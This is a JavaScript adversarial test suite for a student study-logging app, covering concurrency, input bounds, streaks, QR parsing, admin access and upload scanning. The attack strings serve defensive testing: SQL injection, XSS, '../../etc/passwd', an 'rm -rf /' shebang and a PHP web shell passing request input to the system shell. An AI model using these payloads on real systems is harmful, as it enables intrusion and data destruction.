/**
 * Tier 5: Adversarial Edge Case Stress Tests & Security Verification
 * 
 * Comprehensive adversarial test harness verifying:
 * - High-concurrency sequential ID allocation & monotonic stream isolation
 * - Extreme boundary checks on study hours (negative, zero, 24.0, floating point precision)
 * - Streak calculation stress tests with complex gap histories & calendar edge cases
 * - Long school name & text wrapping, clipping, and special Unicode character handling
 * - Tampered QR code payloads, malformed inputs, and malicious ID verification requests
 * - Admin authorization bypass attempts, spoofing, and privilege escalation defense
 * - Database schema & column count invariants under adversarial stress
 */

import { describe, it, expect } from './e2e-runner.js';
import {
  StudySyncDatabase,
  STREAMS,
  STREAM_SUBJECTS,
  ADMIN_WHITELIST,
  filterSchools,
  getStudentSubjects,
  getFocusBadge,
  getProductivityBadge,
  calculateStreak,
  calculateStudentMetrics,
  generateQrPayload,
  parseQrPayload,
  SRI_LANKAN_SCHOOLS,
  normalizeTelegramUsername,
  isValidTelegramHandle,
  formatTelegramDigest,
  inspectMagicBytes,
  validateBinaryBuffer,
  scanBinaryPayload,
  scanBase64Payload,
  SynchronizedSlidingRateLimiter,
  generateSecurityNonce,
  generateIdempotencyKey,
  createIdempotencyEnvelope,
  verifyTimestampDrift,
  escapeHtml,
  sanitizeInput,
  sanitizeUrl,
  sanitizeCsvFormula,
  formatCsvCell,
  generateCsvString,
  NATIONAL_SUBJECT_STATS,
  UNIVERSITY_CUTOFF_TIERS,
  calculatePercentileFromZ,
  calculateSubjectZScore,
  calculateSubjectZScoreDetail,
  calculateCompositeZScore,
  calculateSubjectEma,
  calculateDynamicVelocity,
  calculateTargetGapAnalysis,
  calculateCognitiveFatigueIndex,
  calculateSubjectEntropyEquilibrium,
  calculateStudyRoi,
  generateAiPrescriptions,
  generateComprehensiveCognitiveReport
} from './test-harness.js';

describe("Tier 5: Adversarial Edge Case Stress Tests (T5.1 - T5.7)", () => {

  // ==========================================================================
  // T5.1: High-Concurrency Sequential ID Allocation & Stream Isolation
  // ==========================================================================
  it("T5.1.1: Concurrent mass registration (50 Bio + 50 Maths) preserves strict monotonic ID progression", async () => {
    const db = new StudySyncDatabase();
    const totalBio = 50;
    const totalMaths = 50;

    // Create 100 registration tasks interleaved concurrently
    const registrationTasks = [];
    for (let i = 1; i <= totalBio; i++) {
      registrationTasks.push(async () => {
        return db.registerMember({
          fullName: `Bio Student ${i}`,
          email: `bio.concurrent.${i}@gmail.com`,
          gender: i % 2 === 0 ? "Male" : "Female",
          telegram: `@bio_student_${i}`,
          school: "Royal College, Colombo",
          stream: STREAMS.BIO,
          optionalSubject: "Physics"
        });
      });
    }

    for (let j = 1; j <= totalMaths; j++) {
      registrationTasks.push(async () => {
        return db.registerMember({
          fullName: `Maths Student ${j}`,
          email: `maths.concurrent.${j}@gmail.com`,
          gender: j % 2 === 0 ? "Female" : "Male",
          telegram: `@maths_student_${j}`,
          school: "Visakha Vidyalaya, Colombo",
          stream: STREAMS.MATHS,
          optionalSubject: "ICT"
        });
      });
    }

    // Shuffle tasks to simulate out-of-order concurrent arrivals
    const shuffled = registrationTasks.sort(() => Math.random() - 0.5);
    const results = await Promise.all(shuffled.map(fn => fn()));

    expect(results).toHaveLength(100);
    expect(db.sheets.Members).toHaveLength(100);

    // Verify all 50 Bio IDs are exactly SG-BIO-0001 through SG-BIO-0050
    const bioMembers = db.sheets.Members.filter(m => m.Stream === STREAMS.BIO);
    expect(bioMembers).toHaveLength(50);
    const bioIds = bioMembers.map(m => m["Study ID"]).sort();
    for (let b = 1; b <= 50; b++) {
      const expectedId = `SG-BIO-${String(b).padStart(4, '0')}`;
      expect(bioIds.includes(expectedId)).toBeTruthy();
    }

    // Verify all 50 Maths IDs are exactly SG-MATH-0001 through SG-MATH-0050
    const mathsMembers = db.sheets.Members.filter(m => m.Stream === STREAMS.MATHS);
    expect(mathsMembers).toHaveLength(50);
    const mathsIds = mathsMembers.map(m => m["Study ID"]).sort();
    for (let m = 1; m <= 50; m++) {
      const expectedId = `SG-MATH-${String(m).padStart(4, '0')}`;
      expect(mathsIds.includes(expectedId)).toBeTruthy();
    }
  });

  it("T5.1.2: Race condition defense: 25 simultaneous registrations with identical email creates exactly 1 member row", async () => {
    const db = new StudySyncDatabase();
    const contestedEmail = "single.identity@gmail.com";

    let successCount = 0;
    let errorCount = 0;

    const attempts = Array.from({ length: 25 }, (_, idx) => async () => {
      try {
        db.registerMember({
          fullName: `Candidate Attempt ${idx}`,
          email: contestedEmail,
          gender: "Male",
          telegram: `@attempt_${idx}`,
          school: "Ananda College, Colombo",
          stream: STREAMS.BIO,
          optionalSubject: "Physics"
        });
        successCount++;
      } catch (err) {
        errorCount++;
        expect(err.message).toContain("already exists");
      }
    });

    await Promise.all(attempts.map(fn => fn()));

    expect(successCount).toBe(1);
    expect(errorCount).toBe(24);
    expect(db.sheets.Members).toHaveLength(1);
    expect(db.sheets.Members[0].Email).toBe(contestedEmail);
  });

  it("T5.1.3: Concurrency daily log submission: Multiple rapid submissions for same student/date rejects duplicates", async () => {
    const db = new StudySyncDatabase();
    const member = db.registerMember({
      fullName: "Saman Perera",
      email: "saman.concur@gmail.com",
      gender: "Male",
      telegram: "@saman_p",
      school: "Nalanda College, Colombo",
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

    const targetDate = "2026-08-26";
    let firstSuccess = 0;
    let duplicateRejected = 0;

    const logSubmissions = Array.from({ length: 10 }, (_, i) => async () => {
      const res = db.submitDailyLog({
        studyId: member["Study ID"],
        email: member["Email"],
        dateOfStudy: targetDate,
        subjects: [
          { name: "Biology", hours: 2.0 + i * 0.1, focus: 8, productivity: 8 },
          { name: "Chemistry", hours: 1.5, focus: 8, productivity: 8 },
          { name: "Physics", hours: 1.0, focus: 8, productivity: 8 }
        ],
        notes: `Attempt ${i}`
      });
      if (res.isDuplicate) {
        duplicateRejected++;
      } else {
        firstSuccess++;
      }
    });

    await Promise.all(logSubmissions.map(fn => fn()));

    expect(firstSuccess).toBe(1);
    expect(duplicateRejected).toBe(9);
    expect(db.sheets.DailyLogs).toHaveLength(1);
  });

  // ==========================================================================
  // T5.2: Extreme Boundary Checks on Study Hours & Numeric Precision
  // ==========================================================================
  it("T5.2.1: Rejection of negative study hours across all 3 subject slots", () => {
    const db = new StudySyncDatabase();
    const member = db.registerMember({
      fullName: "Boundary Tester",
      email: "boundary.test@gmail.com",
      gender: "Female",
      telegram: "@boundary",
      school: "Visakha Vidyalaya, Colombo",
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

    // Negative hours in slot 1
    expect(() => db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-20",
      subjects: [
        { name: "Biology", hours: -1.5, focus: 7, productivity: 7 },
        { name: "Chemistry", hours: 2.0, focus: 7, productivity: 7 },
        { name: "Physics", hours: 1.0, focus: 7, productivity: 7 }
      ]
    })).toThrow("Subject hours must be between 0 and 24");

    // Negative hours in slot 2
    expect(() => db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-21",
      subjects: [
        { name: "Biology", hours: 2.0, focus: 7, productivity: 7 },
        { name: "Chemistry", hours: -0.01, focus: 7, productivity: 7 },
        { name: "Physics", hours: 1.0, focus: 7, productivity: 7 }
      ]
    })).toThrow("Subject hours must be between 0 and 24");

    // Negative hours in slot 3
    expect(() => db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-22",
      subjects: [
        { name: "Biology", hours: 2.0, focus: 7, productivity: 7 },
        { name: "Chemistry", hours: 1.0, focus: 7, productivity: 7 },
        { name: "Physics", hours: -999.0, focus: 7, productivity: 7 }
      ]
    })).toThrow("Subject hours must be between 0 and 24");
  });

  it("T5.2.2: Extreme upper bound check: Hours > 24.0 or non-numeric strings throw validation error", () => {
    const db = new StudySyncDatabase();
    const member = db.registerMember({
      fullName: "Upper Boundary",
      email: "upper.bound@gmail.com",
      gender: "Male",
      telegram: "@upper",
      school: "Dharmaraja College, Kandy",
      stream: STREAMS.MATHS,
      optionalSubject: "ICT"
    });

    // 24.1 hours exceeds single-day limit
    expect(() => db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-20",
      subjects: [
        { name: "Combined Maths", hours: 24.1, focus: 8, productivity: 8 },
        { name: "Physics", hours: 0, focus: 8, productivity: 8 },
        { name: "ICT", hours: 0, focus: 8, productivity: 8 }
      ]
    })).toThrow("Subject hours must be between 0 and 24");

    // Text string "three"
    expect(() => db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-21",
      subjects: [
        { name: "Combined Maths", hours: "three", focus: 8, productivity: 8 },
        { name: "Physics", hours: 0, focus: 8, productivity: 8 },
        { name: "ICT", hours: 0, focus: 8, productivity: 8 }
      ]
    })).toThrow("Subject hours must be between 0 and 24");
  });

  it("T5.2.3: Zero hours and exact 24.0 hours boundary accepted without errors", () => {
    const db = new StudySyncDatabase();
    const member = db.registerMember({
      fullName: "Zero And Max",
      email: "zero.max@gmail.com",
      gender: "Female",
      telegram: "@zeromax",
      school: "Mahamaya Girls' College, Kandy",
      stream: STREAMS.BIO,
      optionalSubject: "Agriculture"
    });

    // Exactly 0.0 hours
    const zeroLog = db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-20",
      subjects: [
        { name: "Biology", hours: 0.0, focus: 1, productivity: 1 },
        { name: "Chemistry", hours: 0.0, focus: 1, productivity: 1 },
        { name: "Agriculture", hours: 0.0, focus: 1, productivity: 1 }
      ]
    });
    expect(zeroLog.totalHours).toBe(0);

    // Exactly 24.0 hours across subjects (8 + 8 + 8)
    const maxLog = db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-21",
      subjects: [
        { name: "Biology", hours: 8.0, focus: 10, productivity: 10 },
        { name: "Chemistry", hours: 8.0, focus: 10, productivity: 10 },
        { name: "Agriculture", hours: 8.0, focus: 10, productivity: 10 }
      ]
    });
    expect(maxLog.totalHours).toBe(24.0);
  });

  it("T5.2.4: Floating point precision stress: Adding 0.1 + 0.2 + 0.3 resolves to exact 0.60 without IEEE 754 drift", () => {
    const db = new StudySyncDatabase();
    const member = db.registerMember({
      fullName: "Float Tester",
      email: "float.test@gmail.com",
      gender: "Male",
      telegram: "@floattest",
      school: "Richmond College, Galle",
      stream: STREAMS.MATHS,
      optionalSubject: "Chemistry"
    });

    const res = db.submitDailyLog({
      studyId: member["Study ID"],
      email: member["Email"],
      dateOfStudy: "2026-08-20",
      subjects: [
        { name: "Combined Maths", hours: 0.1, focus: 5, productivity: 5 },
        { name: "Physics", hours: 0.2, focus: 5, productivity: 5 },
        { name: "Chemistry", hours: 0.3, focus: 5, productivity: 5 }
      ]
    });

    expect(res.totalHours).toBe(0.60);

    const logs = db.getStudentLogs(member["Study ID"]);
    const metrics = calculateStudentMetrics(logs);
    expect(metrics.totalHours).toBe(0.60);
    expect(metrics.perSubjectHours["Combined Maths"]).toBe(0.1);
    expect(metrics.perSubjectHours["Physics"]).toBe(0.2);
    expect(metrics.perSubjectHours["Chemistry"]).toBe(0.3);
  });

  // ==========================================================================
  // T5.3: Streak Calculation Stress with Complex Gap Histories & Calendars
  // ==========================================================================
  it("T5.3.1: Broken streak: 10-day streak with 2-day gap resets current streak to 0", () => {
    // 10 consecutive days ending on 2026-08-20, reference date 2026-08-23 (3 day gap)
    const dates = [
      "2026-08-11", "2026-08-12", "2026-08-13", "2026-08-14", "2026-08-15",
      "2026-08-16", "2026-08-17", "2026-08-18", "2026-08-19", "2026-08-20"
    ];

    const currentStreak = calculateStreak(dates, "2026-08-23");
    expect(currentStreak).toBe(0);
  });

  it("T5.3.2: Yesterday grace window: Latest study date yesterday maintains active streak", () => {
    // Study dates ending yesterday (2026-08-25) with reference today (2026-08-26)
    const dates = ["2026-08-23", "2026-08-24", "2026-08-25"];
    const streak = calculateStreak(dates, "2026-08-26");
    expect(streak).toBe(3);
  });

  it("T5.3.3: Month boundary & leap year calendar transitions (Feb 27 -> Feb 28 -> Feb 29 -> Mar 01)", () => {
    // Leap year sequence in 2024
    const leapDates = ["2024-02-27", "2024-02-28", "2024-02-29", "2024-03-01"];
    const streakLeap = calculateStreak(leapDates, "2024-03-01");
    expect(streakLeap).toBe(4);

    // Year-end transition (Dec 30 -> Dec 31 -> Jan 01)
    const yearEndDates = ["2025-12-30", "2025-12-31", "2026-01-01"];
    const streakYearEnd = calculateStreak(yearEndDates, "2026-01-01");
    expect(streakYearEnd).toBe(3);
  });

  it("T5.3.4: Resilience to out-of-order date submissions and duplicate timestamps", () => {
    // Unordered dates with duplicates
    const unorderedDates = [
      "2026-08-24T14:30:00.000Z",
      "2026-08-26T08:00:00.000Z",
      "2026-08-24T19:00:00.000Z", // duplicate day
      "2026-08-25T12:00:00.000Z",
      "2026-08-26T22:15:00.000Z"  // duplicate day
    ];

    const streak = calculateStreak(unorderedDates, "2026-08-26");
    expect(streak).toBe(3); // 24, 25, 26
  });

  it("T5.3.5: 100-day unbroken consecutive streak stress calculation", () => {
    const dates = [];
    const startDate = new Date("2026-01-01T00:00:00Z");
    for (let d = 0; d < 100; d++) {
      const cur = new Date(startDate.getTime() + d * 86400000);
      dates.push(cur.toISOString().substring(0, 10));
    }

    const lastDay = dates[dates.length - 1];
    const streak = calculateStreak(dates, lastDay);
    expect(streak).toBe(100);
  });

  // ==========================================================================
  // T5.4: Long School Names, Special Unicode & Canvas Clipping Checks
  // ==========================================================================
  it("T5.4.1: Extra-long school name (120+ chars) formats and embeds cleanly without crashing", () => {
    const extraLongSchool = "Sri Lanka International Academy of Advanced Mathematics, Engineering, Bio-Medical Research and Linguistic Studies, Colombo 07";
    expect(extraLongSchool.length).toBeGreaterThan(120);

    const db = new StudySyncDatabase();
    const member = db.registerMember({
      fullName: "Nuwan Jayasuriya",
      email: "nuwan.long@gmail.com",
      gender: "Male",
      telegram: "@nuwan_j",
      school: extraLongSchool,
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

    expect(member["School"]).toBe(extraLongSchool);

    // QR generation handles long strings
    const qrPayload = generateQrPayload({
      studyId: member["Study ID"],
      fullName: member["Full Name"],
      school: member["School"],
      stream: member["Stream"],
      registrationDate: member["Registration Date"]
    });

    expect(qrPayload.combinedString).toContain(extraLongSchool);
    const parsed = parseQrPayload(qrPayload.combinedString);
    expect(parsed.offlineData.school).toBe(extraLongSchool);
  });

  it("T5.4.2: Multilingual Unicode & special characters (Sinhala, Tamil, Quotes, Ampersands)", () => {
    const sinhalaSchool = "ශ්‍රී සුමංගල විද්‍යාලය, පාණදුර";
    const tamilName = "செல்வன் குமார்";
    const specialTelegram = "@kumar_&_'quotes'#1";

    const db = new StudySyncDatabase();
    const member = db.registerMember({
      fullName: tamilName,
      email: "kumar.unicode@gmail.com",
      gender: "Male",
      telegram: specialTelegram,
      school: sinhalaSchool,
      stream: STREAMS.MATHS,
      optionalSubject: "ICT"
    });

    expect(member["Full Name"]).toBe(tamilName);
    expect(member["School"]).toBe(sinhalaSchool);
    expect(member["Telegram Username"]).toBe(specialTelegram);

    // Verify lookup by study ID retains exact characters
    const found = db.getMemberByStudyId(member["Study ID"]);
    expect(found.fullName).toBe(tamilName);
    expect(found.school).toBe(sinhalaSchool);
  });

  it("T5.4.3: School dataset validation: All 260+ entries are non-empty unique trimmed strings", () => {
    expect(SRI_LANKAN_SCHOOLS.length).toBeGreaterThanOrEqual(260);
    const set = new Set();
    for (const school of SRI_LANKAN_SCHOOLS) {
      expect(typeof school).toBe("string");
      expect(school.trim().length).toBeGreaterThan(5);
      expect(school.includes(",")).toBeTruthy(); // e.g. "College, City"
      expect(set.has(school)).toBeFalsy(); // No duplicate entries
      set.add(school);
    }
  });

  // ==========================================================================
  // T5.5: Tampered QR Payloads & Malicious Verification Requests
  // ==========================================================================
  it("T5.5.1: Non-existent, forged, and boundary study IDs reject verification safely", () => {
    const db = new StudySyncDatabase();
    
    // Forged IDs
    expect(db.getMemberByStudyId("SG-BIO-9999")).toBeNull();
    expect(db.getMemberByStudyId("SG-MATH-0000")).toBeNull();
    expect(db.getMemberByStudyId("SG-ARTS-0001")).toBeNull();
    expect(db.getMemberByStudyId("INVALID_STUDY_ID")).toBeNull();
    expect(db.getMemberByStudyId("")).toBeNull();
    expect(db.getMemberByStudyId(null)).toBeNull();
    expect(db.getMemberByStudyId(undefined)).toBeNull();
  });

  it("T5.5.2: SQL Injection, XSS, and Path Traversal payload resistance in verification endpoint", () => {
    const db = new StudySyncDatabase();

    const attackPayloads = [
      "SG-BIO-0001' OR '1'='1",
      "<script>alert('xss')</script>",
      "../../etc/passwd",
      "SG-BIO-0001; DROP TABLE Members;--",
      "{\"studyId\": \"SG-BIO-0001\"}",
      "SG-BIO-0001%00nullbyte"
    ];

    for (const attackId of attackPayloads) {
      const result = db.getMemberByStudyId(attackId);
      expect(result).toBeNull();
    }
  });

  it("T5.5.3: Corrupted or tampered QR payload string parsing handles gracefully without throwing unhandled error", () => {
    expect(parseQrPayload("")).toBeNull();
    expect(parseQrPayload("RANDOM_CORRUPTED_STRING_NOT_STUDYSYNC")).toBeNull();
    expect(parseQrPayload(null)).toBeNull();
    expect(parseQrPayload(undefined)).toBeNull();
    expect(parseQrPayload("STUDYSYNC|SG-BIO-0001|invalid_json_data|{corrupted")).toBeNull();
  });

  // ==========================================================================
  // T5.6: Admin Authorization Bypass Attempts & Security Boundaries
  // ==========================================================================
  it("T5.6.1: Direct admin bypass attempts with spoofed emails immediately rejected with Access Denied", () => {
    const db = new StudySyncDatabase();

    const forbiddenEmails = [
      "hacker@gmail.com",
      "admin@studysync.lk.evil.com",
      "fake.admin@studysync.lk",
      "admin@studysync.lk@attacker.com",
      "admin@studysync.lk\0.com",
      "",
      " "
    ];

    for (const email of forbiddenEmails) {
      expect(() => db.getAdminAnalytics(email)).toThrow("Access Denied");
    }
  });

  it("T5.6.2: Legitimate whitelisted admin accounts successfully authenticated", () => {
    const db = new StudySyncDatabase();

    for (const admin of ADMIN_WHITELIST) {
      const analytics = db.getAdminAnalytics(admin);
      expect(analytics).toHaveProperty("kpis");
      expect(analytics).toHaveProperty("streamBreakdown");
      expect(analytics).toHaveProperty("leaderboard");
    }
  });

  it("T5.6.3: Identity spoofing prevention: Student cannot submit daily log using another member's Study ID", () => {
    const db = new StudySyncDatabase();

    const victim = db.registerMember({
      fullName: "Victim Student",
      email: "victim@gmail.com",
      gender: "Female",
      telegram: "@victim",
      school: "Devi Balika Vidyalaya, Colombo",
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

    const attacker = db.registerMember({
      fullName: "Attacker Student",
      email: "attacker@gmail.com",
      gender: "Male",
      telegram: "@attacker",
      school: "Royal College, Colombo",
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

    // Attacker attempts to submit log using victim's Study ID with attacker's email
    expect(() => db.submitDailyLog({
      studyId: victim["Study ID"],
      email: attacker["Email"],
      dateOfStudy: "2026-08-26",
      subjects: [
        { name: "Biology", hours: 2, focus: 8, productivity: 8 },
        { name: "Chemistry", hours: 2, focus: 8, productivity: 8 },
        { name: "Physics", hours: 2, focus: 8, productivity: 8 }
      ]
    })).toThrow("Email mismatch");
  });

  // ==========================================================================
  // T5.7: Database Schema & Invariants Under Stress
  // ==========================================================================
  it("T5.7.1: Invariant: Exactly 10 columns in Members sheet across any registered row", () => {
    const db = new StudySyncDatabase();
    db.registerMember({
      fullName: "Schema Validator",
      email: "schema.val@gmail.com",
      gender: "Male",
      telegram: "@schemaval",
      school: "St. Peter's College, Colombo",
      stream: STREAMS.MATHS,
      optionalSubject: "Chemistry"
    });

    expect(db.sheets.Members).toHaveLength(1);
    const rowKeys = Object.keys(db.sheets.Members[0]);
    expect(rowKeys).toHaveLength(10);
    expect(rowKeys).toEqual(StudySyncDatabase.MEMBERS_COLUMNS);
  });

  it("T5.7.2: Invariant: Exactly 19 columns in DailyLogs sheet across any logged row", () => {
    const db = new StudySyncDatabase();
    const mem = db.registerMember({
      fullName: "Log Schema Validator",
      email: "log.schema@gmail.com",
      gender: "Female",
      telegram: "@logschema",
      school: "Holy Family Convent, Colombo",
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

    db.submitDailyLog({
      studyId: mem["Study ID"],
      email: mem["Email"],
      dateOfStudy: "2026-08-26",
      subjects: [
        { name: "Biology", hours: 3.5, focus: 9, productivity: 9 },
        { name: "Chemistry", hours: 2.0, focus: 8, productivity: 8 },
        { name: "Physics", hours: 1.5, focus: 8, productivity: 8 }
      ],
      notes: "Checking exact column count",
      proofPhotoUrl: "https://drive.google.com/test-proof"
    });

    expect(db.sheets.DailyLogs).toHaveLength(1);
    const logKeys = Object.keys(db.sheets.DailyLogs[0]);
    expect(logKeys).toHaveLength(19);
    expect(logKeys).toEqual(StudySyncDatabase.DAILY_LOGS_COLUMNS);
  });

  it("T5.7.3: Invariant: Slider badges strictly bound to integers 1-10", () => {
    expect(() => getFocusBadge(0)).toThrow("Focus level must be integer 1-10");
    expect(() => getFocusBadge(11)).toThrow("Focus level must be integer 1-10");
    expect(() => getFocusBadge("invalid")).toThrow("Focus level must be integer 1-10");
    expect(() => getProductivityBadge(-5)).toThrow("Productivity level must be integer 1-10");
    expect(() => getProductivityBadge(15)).toThrow("Productivity level must be integer 1-10");

    expect(getFocusBadge(1).color).toBe("rose");
    expect(getFocusBadge(5).color).toBe("amber");
    expect(getFocusBadge(10).color).toBe("emerald");

    expect(getProductivityBadge(2).color).toBe("rose");
    expect(getProductivityBadge(7).color).toBe("amber");
    expect(getProductivityBadge(9).color).toBe("emerald");
  });
}, { tier: 5 });

// ==========================================================================
// T5.8: 12-Byte Structural Magic Byte & Polyglot Disguise Penetration
// ==========================================================================
describe("Tier 5.8: 12-Byte Structural Magic Byte & Polyglot Disguise Penetration", () => {
  it("T5.8.1: WAV audio file disguised with image/webp MIME rejected via RIFF sub-type mismatch", () => {
    const wavBuf = Buffer.alloc(1000);
    wavBuf.write("RIFF", 0, "ascii");
    wavBuf.writeUInt32LE(992, 4);
    wavBuf.write("WAVE", 8, "ascii"); // audio/wav disguised
    wavBuf.write("fmt ", 12, "ascii");
    const res = validateBinaryBuffer(wavBuf, 'image/webp');
    expect(res.valid).toBe(false);
    expect(res.code).toBe("SECURITY_MIME_MISMATCH");
  });

  it("T5.8.2: AVI video file disguised with image/webp MIME rejected via RIFF sub-type mismatch", () => {
    const aviBuf = Buffer.alloc(1000);
    aviBuf.write("RIFF", 0, "ascii");
    aviBuf.writeUInt32LE(992, 4);
    aviBuf.write("AVI ", 8, "ascii"); // video/avi disguised
    aviBuf.write("LIST", 12, "ascii");
    const res = validateBinaryBuffer(aviBuf, 'image/webp');
    expect(res.valid).toBe(false);
    expect(res.code).toBe("SECURITY_MIME_MISMATCH");
  });

  it("T5.8.3: Genuine WebP VP8/VP8L/VP8X passed with strict 12-byte structural verification", () => {
    const webpBuf = Buffer.alloc(500);
    webpBuf.write("RIFF", 0, "ascii");
    webpBuf.writeUInt32LE(492, 4);
    webpBuf.write("WEBP", 8, "ascii");
    webpBuf.write("VP8 ", 12, "ascii");
    const res = validateBinaryBuffer(webpBuf, 'image/webp');
    expect(res.valid).toBe(true);
    expect(res.detectedFormat).toBe("image/webp");
  });

  it("T5.8.4: Rejection of PE, ELF, Mach-O/Java, ZIP polyglot, 7z, and Shebang binaries", () => {
    // PE
    const pe = Buffer.from([0x4D, 0x5A, 0x90, 0x00]);
    expect(inspectMagicBytes(pe).valid).toBe(false);
    expect(inspectMagicBytes(pe).code).toBe("MALWARE_PE_EXECUTABLE");

    // ELF
    const elf = Buffer.from([0x7F, 0x45, 0x4C, 0x46]);
    expect(inspectMagicBytes(elf).valid).toBe(false);
    expect(inspectMagicBytes(elf).code).toBe("MALWARE_LINUX_ELF");

    // Java / Mach-O 32
    const java = Buffer.from([0xCA, 0xFE, 0xBA, 0xBE]);
    expect(inspectMagicBytes(java).valid).toBe(false);
    expect(inspectMagicBytes(java).code).toBe("MALWARE_JAVA_BYTECODE");

    // ZIP
    const zip = Buffer.from([0x50, 0x4B, 0x03, 0x04]);
    expect(inspectMagicBytes(zip).valid).toBe(false);
    expect(inspectMagicBytes(zip).code).toBe("MALWARE_ARCHIVE_ZIP");

    // 7z
    const sevenZ = Buffer.from([0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]);
    expect(inspectMagicBytes(sevenZ).valid).toBe(false);
    expect(inspectMagicBytes(sevenZ).code).toBe("MALWARE_ARCHIVE_7Z");

    // Shebang
    const shebang = Buffer.from("#!/bin/bash\nrm -rf /", "ascii");
    expect(inspectMagicBytes(shebang).valid).toBe(false);
    expect(inspectMagicBytes(shebang).code).toBe("MALWARE_SHEBANG_SCRIPT");
  });

  it("T5.8.5: PHP payload and script tags inside image comment/EXIF rejected with MALWARE_SCRIPT_EMBEDDED", () => {
    const buf = Buffer.alloc(300);
    buf[0] = 0xFF; buf[1] = 0xD8; buf[2] = 0xFF; buf[3] = 0xE0;
    buf.write("JFIF", 6, "ascii");
    buf.write("<?php passthru($_GET['cmd']); ?>", 30, "ascii");
    const scan = scanBinaryPayload(buf);
    expect(scan.safe).toBe(false);
    expect(scan.code).toBe("MALWARE_SCRIPT_EMBEDDED");
  });
}, { tier: 5 });

// ==========================================================================
// T5.9: Cryptographic Replay Attack & Anti-Replay Idempotency Penetration
// ==========================================================================
describe("Tier 5.9: Cryptographic Replay Attack & Anti-Replay Idempotency Penetration", () => {
  it("T5.9.1: Replay attack with timestamp drifted >300s into past rejected with ERR_TIMESTAMP_EXPIRED", () => {
    const expiredTs = new Date(Date.now() - 305 * 1000).toISOString();
    const res = verifyTimestampDrift(expiredTs);
    expect(res.valid).toBe(false);
    expect(res.code).toBe("ERR_TIMESTAMP_EXPIRED");
  });

  it("T5.9.2: Future clock skew tampering >60s rejected with ERR_TIMESTAMP_FUTURE", () => {
    const futureTs = new Date(Date.now() + 65 * 1000).toISOString();
    const res = verifyTimestampDrift(futureTs);
    expect(res.valid).toBe(false);
    expect(res.code).toBe("ERR_TIMESTAMP_FUTURE");
  });

  it("T5.9.3: Identical payload generates deterministic SHA idempotency key for deduplication", () => {
    const payloadA = { studentId: "SG-BIO-0001", date: "2026-08-27", totalHours: 6.0 };
    const payloadB = { studentId: "SG-BIO-0001", date: "2026-08-27", totalHours: 6.0 };
    const payloadC = { studentId: "SG-BIO-0001", date: "2026-08-27", totalHours: 6.5 };

    const nonce = "test_fixed_nonce_123456789012345";
    const keyA = generateIdempotencyKey(payloadA, nonce);
    const keyB = generateIdempotencyKey(payloadB, nonce);
    const keyC = generateIdempotencyKey(payloadC, nonce);

    expect(keyA).toBe(keyB);
    expect(keyA).not.toBe(keyC);
  });

  it("T5.9.4: Nonce entropy verification: 500 generated nonces have zero collisions", () => {
    const nonceSet = new Set();
    for (let i = 0; i < 500; i++) {
      const nonce = generateSecurityNonce();
      expect(nonce.length).toBe(32);
      expect(nonceSet.has(nonce)).toBe(false);
      nonceSet.add(nonce);
    }
    expect(nonceSet.size).toBe(500);
  });
}, { tier: 5 });

// ==========================================================================
// T5.10: High-Concurrency LockService & Race Condition Defense
// ==========================================================================
describe("Tier 5.10: High-Concurrency LockService & Race Condition Defense", () => {
  it("T5.10.1: 50 concurrent registrations under LockService without ID collisions", async () => {
    const db = new StudySyncDatabase();
    const promises = [];
    for (let i = 1; i <= 50; i++) {
      promises.push(
        new Promise((resolve) => {
          const res = db.registerMember({
            fullName: `Concurrent Student ${i}`,
            email: `concurrent.${i}@gmail.com`,
            gender: "Male",
            telegram: `@concurrent_${i}`,
            school: "Royal College, Colombo",
            stream: STREAMS.BIO,
            optionalSubject: "Physics"
          });
          resolve(res);
        })
      );
    }

    const results = await Promise.all(promises);
    expect(results).toHaveLength(50);
    const idSet = new Set(results.map(r => r["Study ID"]));
    expect(idSet.size).toBe(50);
  });

  it("T5.10.2: 25 concurrent daily logs for same student/date single row insertion", async () => {
    const db = new StudySyncDatabase();
    const mem = db.registerMember({
      fullName: "Race Test Student",
      email: "racetest@gmail.com",
      gender: "Male",
      telegram: "@racetest",
      school: "Royal College, Colombo",
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

    const studyId = mem["Study ID"];
    const dateOfStudy = "2026-08-27";
    let successfulSubmissions = 0;
    let duplicateRejections = 0;

    const logPromises = [];
    for (let i = 0; i < 25; i++) {
      logPromises.push(
        new Promise((resolve) => {
          try {
            const res = db.submitDailyLog({
              studyId,
              email: mem.Email,
              dateOfStudy,
              subjects: [
                { name: "Biology", hours: 2.0, focus: 8, productivity: 8 },
                { name: "Chemistry", hours: 2.0, focus: 8, productivity: 8 },
                { name: "Physics", hours: 2.0, focus: 8, productivity: 8 }
              ]
            });
            if (res.isDuplicate) {
              duplicateRejections++;
            } else {
              successfulSubmissions++;
            }
            resolve(res);
          } catch (err) {
            duplicateRejections++;
            resolve({ error: err.message });
          }
        })
      );
    }

    await Promise.all(logPromises);
    const matchingLogs = db.sheets.DailyLogs.filter(l => l["Study ID"] === studyId && l["Date of Study"] === dateOfStudy);
    expect(matchingLogs).toHaveLength(1);
  });
}, { tier: 5 });

// ==========================================================================
// T5.11: IDOR & Horizontal Privilege Escalation Penetration
// ==========================================================================
describe("Tier 5.11: IDOR & Horizontal Privilege Escalation Penetration", () => {
  it("T5.11.1: Student A attempting to query or update Student B study log is rejected", () => {
    const db = new StudySyncDatabase();
    const alice = db.registerMember({
      fullName: "Alice Student",
      email: "alice@gmail.com",
      gender: "Female",
      telegram: "@alice",
      school: "Visakha Vidyalaya, Colombo",
      stream: STREAMS.BIO,
      optionalSubject: "Physics"
    });

